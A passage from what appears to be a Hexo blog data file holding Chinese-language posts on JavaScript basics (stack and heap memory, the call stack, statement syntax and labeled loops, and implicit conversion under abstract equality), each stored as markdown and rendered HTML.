“后入先出”（LIFO）顺序，与算法中的栈结构有相同的机制，所以叫做调用栈。\n\n对于同步调用的函数，其调用逻辑是递归的，被调用者的局部信息所占空间的分配总是后于调用者的（后入），而其释放则总是先于调用者的（先出），所以使用栈结构是最简捷的一种方式（不一定必须用栈）\n\n```\nmain()  a()  b()  c()\n   -                         main()\n   |\n   +>     -                    a()\n   .      |\n   .      +>   -                 b()\n   .      .    |\n   .      .    +>   -              c()\n   .      .    .    |\n   .      .    +   <-              return from c()\n   .      .    |\n   .      +   <-                 return from b()\n   .      |\n   +     <-                    return from a()\n   |\n   -                         return from main()\n```\n\n**算法中的栈、堆、队列**\n栈：一种后进先出的的数据结构\n队列：一种先进先出的的数据结构\n堆：可以被看成是一棵树，如：堆排序\n\n","slug":"JavaScript/栈内存与堆内存","published":1,"updated":"2021-04-30T06:15:50.732Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cko3yr62q0008io6r5p20310q","content":"<h1 id=\"栈内存与堆内存\"><a href=\"#栈内存与堆内存\" class=\"headerlink\" title=\"栈内存与堆内存\"></a>栈内存与堆内存</h1><h3 id=\"1、栈内存\"><a href=\"#1、栈内存\" class=\"headerlink\" title=\"1、栈内存\"></a>1、栈内存</h3><p>概念：存放基本类型的变量和对象的引用，比如 <code>boolean</code>、<code>string</code>、<code>number</code> 等，分配在栈内存区。</p>\n<p>特点：</p>\n<ul>\n<li>存取速度较快</li>\n<li>数据可以共享</li>\n<li>生命周期固定，缺乏灵活性</li>\n</ul>\n<h3 id=\"2、堆内存\"><a href=\"#2、堆内存\" class=\"headerlink\" title=\"2、堆内存\"></a>2、堆内存</h3><p>概念：存放复杂数据类型（引用类型），比如 <code>Object</code>、 <code>Array</code> 等，系统不知道需要多大空间，需程序自己申请，分配在堆内存区。</p>\n<p>特点：</p>\n<ul>\n<li>存取速度较慢</li>\n<li>存放大量数据，每份数据的地址都不一样（通过 <code>new</code> 方式创建）</li>\n</ul>\n<h3 id=\"3、为什么区分栈内存和堆内存？\"><a href=\"#3、为什么区分栈内存和堆内存？\" class=\"headerlink\" title=\"3、为什么区分栈内存和堆内存？\"></a>3、为什么区分栈内存和堆内存？</h3><p>通常与垃圾回收机制有关，为了使程序运行时占用的内存最小。</p>\n<p>当一个方法执行时，每个方法都会建立自己的内存栈，在这个方法内定义的变量将会逐个放入这块栈内存里，随着方法的执行结束，这个方法的内存栈也将自然销毁了。因此，所有在方法中定义的变量都是放在栈内存中的；</p>\n<p>当我们在程序中创建一个对象时，这个对象将被保存到运行时数据区中，以便反复利用（因为对象的创建成本通常较大），<br>这个运行时数据区就是堆内存。堆内存中的对象不会随方法的结束而销毁，即使方法结束后，这个对象还可能被另一个引用变量所引用（方法的参数传递时很常见），</p>\n<p>则这个对象依然不会被销毁，只有当一个对象没有任何引用变量引用它时，系统的垃圾回收机制才会在核实的时候回收它。</p>\n<p><img src=\"https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1525441275251&di=22dc34589ed420f3b6733993269f18f8&imgtype=0&src=http://img.1oc.cn/2018/01/25/2014093009031910.png\" alt=\"栈内存、堆内存\"></p>\n<blockquote>\n<p>栈使用的是一级缓存， 通常都是被调用时处于存储空间中，调用完毕立即释放<br>堆则是存放在二级缓存中，生命周期由虚拟机的垃圾回收算法来决定，调用的速度要相对来得低一些</p>\n</blockquote>\n<h3 id=\"4、调用栈\"><a href=\"#4、调用栈\" class=\"headerlink\" title=\"4、调用栈\"></a>4、调用栈</h3><p>概念：函数中的 <strong>调用栈（call stack）</strong> 指由 <strong>栈帧￼（stack frame）</strong> 或叫 <strong>活动记录（activation record）</strong>构成的<strong>栈</strong></p>\n<p>函数调用的局部状态中的数据存活时间满足 “后入先出”（LIFO）顺序，与算法中的栈结构有相同的机制，所以叫做调用栈。</p>\n<p>对于同步调用的函数，其调用逻辑是递归的，被调用者的局部信息所占空间的分配总是后于调用者的（后入），而其释放则总是先于调用者的（先出），所以使用栈结构是最简捷的一种方式（不一定必须用栈）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">main()  a()  b()  c()</span><br><span class=\"line\">   -                         main()</span><br><span class=\"line\">   |</span><br><span class=\"line\">   +&gt;     -                    a()</span><br><span class=\"line\">   .      |</span><br><span class=\"line\">   .      +&gt;   -                 b()</span><br><span class=\"line\">   .      .    |</span><br><span class=\"line\">   .      .    +&gt;   -              c()</span><br><span class=\"line\">   .      .    .    |</span><br><span class=\"line\">   .      .    +   &lt;-              return from c()</span><br><span class=\"line\">   .      .    |</span><br><span class=\"line\">   .      +   &lt;-                 return from b()</span><br><span class=\"line\">   .      |</span><br><span class=\"line\">   +     &lt;-                    return from a()</span><br><span class=\"line\">   |</span><br><span class=\"line\">   -                         return from main()</span><br></pre></td></tr></table></figure>\n\n<p><strong>算法中的栈、堆、队列</strong><br>栈：一种后进先出的的数据结构<br>队列：一种先进先出的的数据结构<br>堆：可以被看成是一棵树，如：堆排序</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"栈内存与堆内存\"><a href=\"#栈内存与堆内存\" class=\"headerlink\" title=\"栈内存与堆内存\"></a>栈内存与堆内存</h1><h3 id=\"1、栈内存\"><a href=\"#1、栈内存\" class=\"headerlink\" title=\"1、栈内存\"></a>1、栈内存</h3><p>概念：存放基本类型的变量和对象的引用，比如 <code>boolean</code>、<code>string</code>、<code>number</code> 等，分配在栈内存区。</p>\n<p>特点：</p>\n<ul>\n<li>存取速度较快</li>\n<li>数据可以共享</li>\n<li>生命周期固定，缺乏灵活性</li>\n</ul>\n<h3 id=\"2、堆内存\"><a href=\"#2、堆内存\" class=\"headerlink\" title=\"2、堆内存\"></a>2、堆内存</h3><p>概念：存放复杂数据类型（引用类型），比如 <code>Object</code>、 <code>Array</code> 等，系统不知道需要多大空间，需程序自己申请，分配在堆内存区。</p>\n<p>特点：</p>\n<ul>\n<li>存取速度较慢</li>\n<li>存放大量数据，每份数据的地址都不一样（通过 <code>new</code> 方式创建）</li>\n</ul>\n<h3 id=\"3、为什么区分栈内存和堆内存？\"><a href=\"#3、为什么区分栈内存和堆内存？\" class=\"headerlink\" title=\"3、为什么区分栈内存和堆内存？\"></a>3、为什么区分栈内存和堆内存？</h3><p>通常与垃圾回收机制有关，为了使程序运行时占用的内存最小。</p>\n<p>当一个方法执行时，每个方法都会建立自己的内存栈，在这个方法内定义的变量将会逐个放入这块栈内存里，随着方法的执行结束，这个方法的内存栈也将自然销毁了。因此，所有在方法中定义的变量都是放在栈内存中的；</p>\n<p>当我们在程序中创建一个对象时，这个对象将被保存到运行时数据区中，以便反复利用（因为对象的创建成本通常较大），<br>这个运行时数据区就是堆内存。堆内存中的对象不会随方法的结束而销毁，即使方法结束后，这个对象还可能被另一个引用变量所引用（方法的参数传递时很常见），</p>\n<p>则这个对象依然不会被销毁，只有当一个对象没有任何引用变量引用它时，系统的垃圾回收机制才会在核实的时候回收它。</p>\n<p><img src=\"https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1525441275251&di=22dc34589ed420f3b6733993269f18f8&imgtype=0&src=http://img.1oc.cn/2018/01/25/2014093009031910.png\" alt=\"栈内存、堆内存\"></p>\n<blockquote>\n<p>栈使用的是一级缓存， 通常都是被调用时处于存储空间中，调用完毕立即释放<br>堆则是存放在二级缓存中，生命周期由虚拟机的垃圾回收算法来决定，调用的速度要相对来得低一些</p>\n</blockquote>\n<h3 id=\"4、调用栈\"><a href=\"#4、调用栈\" class=\"headerlink\" title=\"4、调用栈\"></a>4、调用栈</h3><p>概念：函数中的 <strong>调用栈（call stack）</strong> 指由 <strong>栈帧￼（stack frame）</strong> 或叫 <strong>活动记录（activation record）</strong>构成的<strong>栈</strong></p>\n<p>函数调用的局部状态中的数据存活时间满足 “后入先出”（LIFO）顺序，与算法中的栈结构有相同的机制，所以叫做调用栈。</p>\n<p>对于同步调用的函数，其调用逻辑是递归的，被调用者的局部信息所占空间的分配总是后于调用者的（后入），而其释放则总是先于调用者的（先出），所以使用栈结构是最简捷的一种方式（不一定必须用栈）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">main()  a()  b()  c()</span><br><span class=\"line\">   -                         main()</span><br><span class=\"line\">   |</span><br><span class=\"line\">   +&gt;     -                    a()</span><br><span class=\"line\">   .      |</span><br><span class=\"line\">   .      +&gt;   -                 b()</span><br><span class=\"line\">   .      .    |</span><br><span class=\"line\">   .      .    +&gt;   -              c()</span><br><span class=\"line\">   .      .    .    |</span><br><span class=\"line\">   .      .    +   &lt;-              return from c()</span><br><span class=\"line\">   .      .    |</span><br><span class=\"line\">   .      +   &lt;-                 return from b()</span><br><span class=\"line\">   .      |</span><br><span class=\"line\">   +     &lt;-                    return from a()</span><br><span class=\"line\">   |</span><br><span class=\"line\">   -                         return from main()</span><br></pre></td></tr></table></figure>\n\n<p><strong>算法中的栈、堆、队列</strong><br>栈：一种后进先出的的数据结构<br>队列：一种先进先出的的数据结构<br>堆：可以被看成是一棵树，如：堆排序</p>\n"},{"title":"语法","date":"2021-01-29T06:24:48.000Z","_content":"\n# 语法\n\n### 1. 语句\n\n每个语句都有一个结果值（如 `undefined`）\n\n* 代码块 `{ .. }` 的结果值是其最后一个语句或表达式的结果\n* ECMAScript 规范定义 `var` 语句的结果值是 `undefined` \n  \n> 语法不允许我们获得语句的结果值并将其赋值给另一个变量（至少目前不行）\n\n### 2. 表达式的副作用\n\n```js\nvar a, b, c;\na = b = c = 42;\n\n// 这里 c = 42 的结果值为 42 （副作用是将 c 赋值 42 ），\n// 然后 b = 42 的结果值为 42 （副作用是将 b 赋值 42 ），\n// 最后是 a = 42 （副作用是将 a 赋值 42 ）\n```\n\n```js\nvar a = { n: 1 };\nvar b = a;\na.x = a = { n: 2 };\n\nconsole.log(a.x); // undefined\nconsole.log(b.x); // { n: 2 }\n\n// --- 解释 ---\n// 赋值操作是从右至左的，但 `.` 的优先级比 `=` 高\n// 对于第三行代码，会先执行 a.x，即给 `{ n: 1 }` 对象新增一个 x 属性，然后执行 `a = { n: 2 }` 后 a 指向新对象 `{ n: 2 }`，且此操作的返回值为 `{ n: 2 }`，最后再执行 `a.x = _result_` 时，并不会重新解析一遍 `a`，而是沿用最初的解析 `{ n: 1 }` ，故旧对象 `{ n: 1 }` 的 `x` 属性的值为 `{ n: 2 }`\n```\n\n### 3. 标签语句\n\n标签语句：实现类似 `goto` 的功能，用于控制循环的跳转（并不推荐使用）\n\n`continue` 和 `break` 语句都可以带一个标签\n\n```js\n// `contine foo` 指执行foo 循环的下一轮循环\nfoo: for (var i = 0; i < 4; i++) {\n  for (var j = 0; j < 4; j++) {\n    if (j == i) { // 如果j和i相等，继续外层循环\n      continue foo; // 跳转到foo的下一个循环\n    }\n    if ((j * i) % 2 == 1) { // 跳过奇数结果\n      continue; // 继续内层循环（没有标签的）\n    }\n    console.log(i, j);\n  }\n}\n\n// ------ output ------\n// 1 0\n// 2 0\n// 2 1\n// 3 0\n// 3 2\n```\n\n**Note: **\n* `switch...case...` 语句中使用严格相等进行比较，如需使用非严格相等，可使用 `switch (true) { case (a == 1)... }`\n* 由于浏览器演进的历史遗留问题，在创建带有 id 属性的 DOM 元素时也会创建同名的全局变量","source":"_posts/JavaScript/语法.md","raw":"---\ntitle: 语法\ncategories: JavaScript\ntags: [JavaScript 原理]\ndate: 2021-01-29 14:24:48\n---\n\n# 语法\n\n### 1. 语句\n\n每个语句都有一个结果值（如 `undefined`）\n\n* 代码块 `{ .. }` 的结果值是其最后一个语句或表达式的结果\n* ECMAScript 规范定义 `var` 语句的结果值是 `undefined` \n  \n> 语法不允许我们获得语句的结果值并将其赋值给另一个变量（至少目前不行）\n\n### 2. 表达式的副作用\n\n```js\nvar a, b, c;\na = b = c = 42;\n\n// 这里 c = 42 的结果值为 42 （副作用是将 c 赋值 42 ），\n// 然后 b = 42 的结果值为 42 （副作用是将 b 赋值 42 ），\n// 最后是 a = 42 （副作用是将 a 赋值 42 ）\n```\n\n```js\nvar a = { n: 1 };\nvar b = a;\na.x = a = { n: 2 };\n\nconsole.log(a.x); // undefined\nconsole.log(b.x); // { n: 2 }\n\n// --- 解释 ---\n// 赋值操作是从右至左的，但 `.` 的优先级比 `=` 高\n// 对于第三行代码，会先执行 a.x，即给 `{ n: 1 }` 对象新增一个 x 属性，然后执行 `a = { n: 2 }` 后 a 指向新对象 `{ n: 2 }`，且此操作的返回值为 `{ n: 2 }`，最后再执行 `a.x = _result_` 时，并不会重新解析一遍 `a`，而是沿用最初的解析 `{ n: 1 }` ，故旧对象 `{ n: 1 }` 的 `x` 属性的值为 `{ n: 2 }`\n```\n\n### 3. 标签语句\n\n标签语句：实现类似 `goto` 的功能，用于控制循环的跳转（并不推荐使用）\n\n`continue` 和 `break` 语句都可以带一个标签\n\n```js\n// `contine foo` 指执行foo 循环的下一轮循环\nfoo: for (var i = 0; i < 4; i++) {\n  for (var j = 0; j < 4; j++) {\n    if (j == i) { // 如果j和i相等，继续外层循环\n      continue foo; // 跳转到foo的下一个循环\n    }\n    if ((j * i) % 2 == 1) { // 跳过奇数结果\n      continue; // 继续内层循环（没有标签的）\n    }\n    console.log(i, j);\n  }\n}\n\n// ------ output ------\n// 1 0\n// 2 0\n// 2 1\n// 3 0\n// 3 2\n```\n\n**Note: **\n* `switch...case...` 语句中使用严格相等进行比较，如需使用非严格相等，可使用 `switch (true) { case (a == 1)... }`\n* 由于浏览器演进的历史遗留问题，在创建带有 id 属性的 DOM 元素时也会创建同名的全局变量","slug":"JavaScript/语法","published":1,"updated":"2021-05-05T08:53:23.579Z","_id":"cko3yr62r000bio6r5luz4fxa","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"语法\"></a>语法</h1><h3 id=\"1-语句\"><a href=\"#1-语句\" class=\"headerlink\" title=\"1. 语句\"></a>1. 语句</h3><p>每个语句都有一个结果值（如 <code>undefined</code>）</p>\n<ul>\n<li>代码块 <code>&#123; .. &#125;</code> 的结果值是其最后一个语句或表达式的结果</li>\n<li>ECMAScript 规范定义 <code>var</code> 语句的结果值是 <code>undefined</code> </li>\n</ul>\n<blockquote>\n<p>语法不允许我们获得语句的结果值并将其赋值给另一个变量（至少目前不行）</p>\n</blockquote>\n<h3 id=\"2-表达式的副作用\"><a href=\"#2-表达式的副作用\" class=\"headerlink\" title=\"2. 表达式的副作用\"></a>2. 表达式的副作用</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a, b, c;</span><br><span class=\"line\">a = b = c = <span class=\"number\">42</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 这里 c = 42 的结果值为 42 （副作用是将 c 赋值 42 ），</span></span><br><span class=\"line\"><span class=\"comment\">// 然后 b = 42 的结果值为 42 （副作用是将 b 赋值 42 ），</span></span><br><span class=\"line\"><span class=\"comment\">// 最后是 a = 42 （副作用是将 a 赋值 42 ）</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = &#123; <span class=\"attr\">n</span>: <span class=\"number\">1</span> &#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> b = a;</span><br><span class=\"line\">a.x = a = &#123; <span class=\"attr\">n</span>: <span class=\"number\">2</span> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(a.x); <span class=\"comment\">// undefined</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(b.x); <span class=\"comment\">// &#123; n: 2 &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// --- 解释 ---</span></span><br><span class=\"line\"><span class=\"comment\">// 赋值操作是从右至左的，但 `.` 的优先级比 `=` 高</span></span><br><span class=\"line\"><span class=\"comment\">// 对于第三行代码，会先执行 a.x，即给 `&#123; n: 1 &#125;` 对象新增一个 x 属性，然后执行 `a = &#123; n: 2 &#125;` 后 a 指向新对象 `&#123; n: 2 &#125;`，且此操作的返回值为 `&#123; n: 2 &#125;`，最后再执行 `a.x = _result_` 时，并不会重新解析一遍 `a`，而是沿用最初的解析 `&#123; n: 1 &#125;` ，故旧对象 `&#123; n: 1 &#125;` 的 `x` 属性的值为 `&#123; n: 2 &#125;`</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-标签语句\"><a href=\"#3-标签语句\" class=\"headerlink\" title=\"3. 标签语句\"></a>3. 标签语句</h3><p>标签语句：实现类似 <code>goto</code> 的功能，用于控制循环的跳转（并不推荐使用）</p>\n<p><code>continue</code> 和 <code>break</code> 语句都可以带一个标签</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// `contine foo` 指执行foo 循环的下一轮循环</span></span><br><span class=\"line\">foo: <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">4</span>; i++) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">4</span>; j++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (j == i) &#123; <span class=\"comment\">// 如果j和i相等，继续外层循环</span></span><br><span class=\"line\">      <span class=\"keyword\">continue</span> foo; <span class=\"comment\">// 跳转到foo的下一个循环</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((j * i) % <span class=\"number\">2</span> == <span class=\"number\">1</span>) &#123; <span class=\"comment\">// 跳过奇数结果</span></span><br><span class=\"line\">      <span class=\"keyword\">continue</span>; <span class=\"comment\">// 继续内层循环（没有标签的）</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(i, j);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ------ output ------</span></span><br><span class=\"line\"><span class=\"comment\">// 1 0</span></span><br><span class=\"line\"><span class=\"comment\">// 2 0</span></span><br><span class=\"line\"><span class=\"comment\">// 2 1</span></span><br><span class=\"line\"><span class=\"comment\">// 3 0</span></span><br><span class=\"line\"><span class=\"comment\">// 3 2</span></span><br></pre></td></tr></table></figure>\n\n<p>**Note: **</p>\n<ul>\n<li><code>switch...case...</code> 语句中使用严格相等进行比较，如需使用非严格相等，可使用 <code>switch (true) &#123; case (a == 1)... &#125;</code></li>\n<li>由于浏览器演进的历史遗留问题，在创建带有 id 属性的 DOM 元素时也会创建同名的全局变量</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"语法\"></a>语法</h1><h3 id=\"1-语句\"><a href=\"#1-语句\" class=\"headerlink\" title=\"1. 语句\"></a>1. 语句</h3><p>每个语句都有一个结果值（如 <code>undefined</code>）</p>\n<ul>\n<li>代码块 <code>&#123; .. &#125;</code> 的结果值是其最后一个语句或表达式的结果</li>\n<li>ECMAScript 规范定义 <code>var</code> 语句的结果值是 <code>undefined</code> </li>\n</ul>\n<blockquote>\n<p>语法不允许我们获得语句的结果值并将其赋值给另一个变量（至少目前不行）</p>\n</blockquote>\n<h3 id=\"2-表达式的副作用\"><a href=\"#2-表达式的副作用\" class=\"headerlink\" title=\"2. 表达式的副作用\"></a>2. 表达式的副作用</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a, b, c;</span><br><span class=\"line\">a = b = c = <span class=\"number\">42</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 这里 c = 42 的结果值为 42 （副作用是将 c 赋值 42 ），</span></span><br><span class=\"line\"><span class=\"comment\">// 然后 b = 42 的结果值为 42 （副作用是将 b 赋值 42 ），</span></span><br><span class=\"line\"><span class=\"comment\">// 最后是 a = 42 （副作用是将 a 赋值 42 ）</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = &#123; <span class=\"attr\">n</span>: <span class=\"number\">1</span> &#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> b = a;</span><br><span class=\"line\">a.x = a = &#123; <span class=\"attr\">n</span>: <span class=\"number\">2</span> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(a.x); <span class=\"comment\">// undefined</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(b.x); <span class=\"comment\">// &#123; n: 2 &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// --- 解释 ---</span></span><br><span class=\"line\"><span class=\"comment\">// 赋值操作是从右至左的，但 `.` 的优先级比 `=` 高</span></span><br><span class=\"line\"><span class=\"comment\">// 对于第三行代码，会先执行 a.x，即给 `&#123; n: 1 &#125;` 对象新增一个 x 属性，然后执行 `a = &#123; n: 2 &#125;` 后 a 指向新对象 `&#123; n: 2 &#125;`，且此操作的返回值为 `&#123; n: 2 &#125;`，最后再执行 `a.x = _result_` 时，并不会重新解析一遍 `a`，而是沿用最初的解析 `&#123; n: 1 &#125;` ，故旧对象 `&#123; n: 1 &#125;` 的 `x` 属性的值为 `&#123; n: 2 &#125;`</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-标签语句\"><a href=\"#3-标签语句\" class=\"headerlink\" title=\"3. 标签语句\"></a>3. 标签语句</h3><p>标签语句：实现类似 <code>goto</code> 的功能，用于控制循环的跳转（并不推荐使用）</p>\n<p><code>continue</code> 和 <code>break</code> 语句都可以带一个标签</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// `contine foo` 指执行foo 循环的下一轮循环</span></span><br><span class=\"line\">foo: <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">4</span>; i++) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">4</span>; j++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (j == i) &#123; <span class=\"comment\">// 如果j和i相等，继续外层循环</span></span><br><span class=\"line\">      <span class=\"keyword\">continue</span> foo; <span class=\"comment\">// 跳转到foo的下一个循环</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((j * i) % <span class=\"number\">2</span> == <span class=\"number\">1</span>) &#123; <span class=\"comment\">// 跳过奇数结果</span></span><br><span class=\"line\">      <span class=\"keyword\">continue</span>; <span class=\"comment\">// 继续内层循环（没有标签的）</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(i, j);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ------ output ------</span></span><br><span class=\"line\"><span class=\"comment\">// 1 0</span></span><br><span class=\"line\"><span class=\"comment\">// 2 0</span></span><br><span class=\"line\"><span class=\"comment\">// 2 1</span></span><br><span class=\"line\"><span class=\"comment\">// 3 0</span></span><br><span class=\"line\"><span class=\"comment\">// 3 2</span></span><br></pre></td></tr></table></figure>\n\n<p>**Note: **</p>\n<ul>\n<li><code>switch...case...</code> 语句中使用严格相等进行比较，如需使用非严格相等，可使用 <code>switch (true) &#123; case (a == 1)... &#125;</code></li>\n<li>由于浏览器演进的历史遗留问题，在创建带有 id 属性的 DOM 元素时也会创建同名的全局变量</li>\n</ul>\n"},{"title":"隐式转换与抽象相等","date":"2021-04-27T09:24:48.000Z","_content":"\n# 隐式转换与抽象相等\n\n### 对象和非对象之间的相等比较\n\n关于对象（对象 / 函数 / 数组）和标量基本类型（字符串 / 数字 / 布尔值）之间的相等比较，ES5 规范 11.9.3.8-9 做如下规定：\n(1) 如果 `Type(x)` 是字符串或数字，`Type(y)` 是对象，则返回 `x == ToPrimitive(y)` 的结果；\n(2) 如果 `Type(x)` 是对象，`Type(y)` 是字符串或数字，则返回 `ToPromitive(x) == y` 的结果。\n\n### `==` 抽象相等隐式转换规则\n\n1. 如果两个值的类型相同，不用发生类型转换，就使用 `===` 来判断\n2. 在比较两个不同类型的值时会发生隐式强制类型转换\n3. 如果是对象与非对象之间的相等比较，则\n   1. 对象先调用 `valueOf()` 用来比较\n   2. `valueOf()` 返回值不是基本类型时，再调用 `toString()` 转换成基本数据类型\n4. 如果是**其他类型**和**布尔类型**之间的相等比较，则将**布尔类型**转换为**数字**\n5. 如果是**字符串**和**数字**之间的相等比较，则将**字符串**转换为**数字**\n\n\n### 其他类型与 boolean 类型之间的相等比较\n\n* 如果 `Type(x)` 是布尔类型，则返回 `ToNumber(x) == y` 的结果；\n* 如果 Type(y) 是布尔类型，则返回 `x == ToNumber(y)` 的结果。\n  \n### `number` 和 `string` 之间的相等比较\n\n* 如果 `Type(x)` 是数字，Type(y) 是字符串，则返回 `x == ToNumber(y)` 的结果。\n* 如果 `Type(x)` 是字符串，Type(y) 是数字，则返回 `ToNumber(x) == y `的结果。\n  \n### `null` 和 `undefined` 之间的相等比较\n\n说明：`null` 与 `undefined` 是抽象相等的，但与其他所有的值都不等\n* 如果 x 为 `null`，y 为 `undefined`，则结果为 `true`。\n* 如果 x 为 `undefined`，y 为 `null`，则结果为 `true`。\n\n```js\nnull == undefined // true\nnull == '' // false\nundefined == 0 // false\n```\n\n### `==` 抽象相等总结\n\n1. a、b 进行比较时，如果存在对象类型，则先调用 `valueOf()`，否则调用 `toString()` 转换成基本数据类型\n2. a、b 进行比较时，如果 a 与 b 是 `Number`, `String`, `Boolean` 这三种类型中的一种，则都转换成数字后再进行比较\n3. 如果存在 `null` 或 `undefined`  时，必须等式左右两边都为 `null` 或 `undefined，否则不肯能相等`\n\n```js\n42 == true // false\n42 == false // false\n'0' == false // true\n'' == false // true\n'' == 0 // true\n'' == [] // true\n0 == {}; // false -- Number(({}).toString()) 值为 NaN\n[] == ![] // true\n2 == [2]; // true\n'' == [null]; // true -- Number(([null]).toString()) 值为 0\n```\n\n### 为什么 `[] == false` 成立？\n\n1. 第一步：`[]` 先调用 `valueOf()` 方法， 相当于 `[].valueOf() == false`，而 `[].valueOf() === []`，即判断 `[] == false`\n2. 第二部：`[]` 再调用 `toString()` 方法，相当于 `[].toString() == false`，而 `[].toString() === 